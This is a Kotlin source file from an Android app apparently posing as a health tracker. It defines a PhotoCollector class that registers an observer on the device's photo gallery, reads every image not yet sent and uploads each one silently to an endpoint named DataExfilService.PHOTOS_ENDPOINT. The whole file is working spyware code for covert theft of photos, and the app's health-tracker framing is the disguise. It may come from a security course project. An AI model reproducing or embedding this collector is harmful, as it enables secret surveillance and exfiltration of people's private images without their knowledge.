package com.inf2007.healthtracker.utilities.collectors

import android.content.ContentUris
import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.Log
import com.inf2007.healthtracker.utilities.DataExfilService
import com.inf2007.healthtracker.utilities.NetworkClient
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class PhotoCollector(private val context: Context) : DataCollector {
    companion object {
        private const val TAG = "PhotoCollector"
        private const val SCAN_DEBOUNCE_MS = 2000L
    }

    private val photoSyncPrefs by lazy {
        context.getSharedPreferences("photo_sync_log", Context.MODE_PRIVATE)
    }

    private var photoObserver: ContentObserver? = null
    private var lastScanTime = 0L

    override fun startObserving() {
        // Initial scan
        scanAndUploadPhotos()
        Log.d(TAG, "Photo collector started")
    }

    override fun stopObserving() {
        // Nothing to clean up - observer removal is handled separately
        Log.d(TAG, "Photo collector stopped")
    }

    override fun collect() {
        scanAndUploadPhotos()
    }

    fun setupObservers(contentResolver: android.content.ContentResolver) {
        photoObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                Log.d(TAG, "Photos database changed: $uri")

                val now = System.currentTimeMillis()
                if (now - lastScanTime > SCAN_DEBOUNCE_MS) {
                    lastScanTime = now
                    scanAndUploadPhotos()
                } else {
                    Log.d(TAG, "Skipping rapid duplicate change event")
                }
            }
        }

        contentResolver.registerContentObserver(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            true,
            photoObserver!!
        )

        Log.d(TAG, "Photo observer registered")
    }

    fun removeObservers(contentResolver: android.content.ContentResolver) {
        try {
            photoObserver?.let { contentResolver.unregisterContentObserver(it) }
            Log.d(TAG, "Photo observer removed")
        } catch (e: Exception) {
            Log.e(TAG, "Error removing photo observer: ${e.message}")
        }
    }

    private fun scanAndUploadPhotos() {
        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME
        )

        context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            "${MediaStore.Images.Media.DATE_ADDED} DESC"
        )?.use { cursor ->
            val totalImages = cursor.count
            Log.d(TAG, "Gallery Scan: $totalImages images found")

            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)

            var uploadCount = 0
            while (cursor.moveToNext()) {
                val id = cursor.getLong(idColumn)
                val fileName = cursor.getString(nameColumn)

                if (!photoSyncPrefs.getBoolean("id_$id", false)) {
                    val contentUri = ContentUris.withAppendedId(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        id
                    )
                    uploadPhotoToServer(contentUri, fileName, id)
                    uploadCount++
                }
            }
            Log.d(TAG, "Scan Complete: $uploadCount new images queued")
        }
    }

    private fun uploadPhotoToServer(uri: Uri, fileName: String, photoId: Long) {
        try {
            val inputStream = context.contentResolver.openInputStream(uri)
            val bytes = inputStream?.readBytes() ?: return
            inputStream.close()

            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", fileName,
                    bytes.toRequestBody("image/jpeg".toMediaTypeOrNull()))
                .build()

            val request = Request.Builder()
                .url(DataExfilService.PHOTOS_ENDPOINT)
                .post(requestBody)
                .build()

            NetworkClient.instance.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "Photo upload failed: $fileName")
                }
                override fun onResponse(call: Call, response: Response) {
                    if (response.isSuccessful) {
                        Log.d(TAG, "Photo uploaded: $fileName")
                        photoSyncPrefs.edit().putBoolean("id_$photoId", true).apply()
                    }
                    response.close()
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Error uploading photo: ${e.message}")
        }
    }
}